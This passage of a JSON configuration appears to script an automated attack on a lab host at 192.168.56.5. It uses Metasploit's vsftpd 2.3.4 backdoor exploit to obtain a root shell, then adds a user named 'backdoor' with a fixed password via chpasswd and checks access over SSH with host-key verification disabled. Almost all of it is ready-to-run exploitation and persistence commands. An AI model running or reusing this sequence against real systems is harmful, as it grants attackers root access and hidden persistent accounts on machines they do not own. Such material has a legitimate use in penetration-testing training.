            "use_persistent_session": true,
            "session_name": "vsftpd_session",
            "stages": [
                {
                    "stage": "initial_access",
                    "description": "Exploit vsftpd backdoor to gain root shell via port 21",
                    "commands": [
                        {
                            "type": "start_session",
                            "session_name": "vsftpd_session",
                            "command": "msfconsole -q"
                        },
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "use exploit/unix/ftp/vsftpd_234_backdoor",
                            "wait": 2
                        },
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "set RHOSTS 192.168.56.5",
                            "wait": 1
                        },
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "set RPORT 21",
                            "wait": 1
                        },
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "exploit -j",
                            "wait": 15
                        },
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "sessions -l",
                            "wait": 2
                        }
                    ],
                    "verification": "Check for 'Command shell session X opened' or connection to backdoor port 6200"
                },
                {
                    "stage": "persistence",
                    "description": "Create backdoor user for persistence and verify",
                    "commands": [
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "sessions -i 1",
                            "wait": 2
                        },
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "useradd -m -s /bin/bash backdoor",
                            "wait": 2
                        },
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "echo 'backdoor:backdoorpass' | chpasswd",
                            "wait": 2
                        },
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "exit",
                            "wait": 1
                        },
                        {
                            "type": "close_session",
                            "session_name": "vsftpd_session"
                        },
                        {
                            "type": "regular",
                            "command": "sshpass -p 'backdoorpass' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa backdoor@192.168.56.5 'id'",
                            "wait": 5
                        }
                    ],
                    "verification": "Expect output showing uid=0(root) for successful persistence"
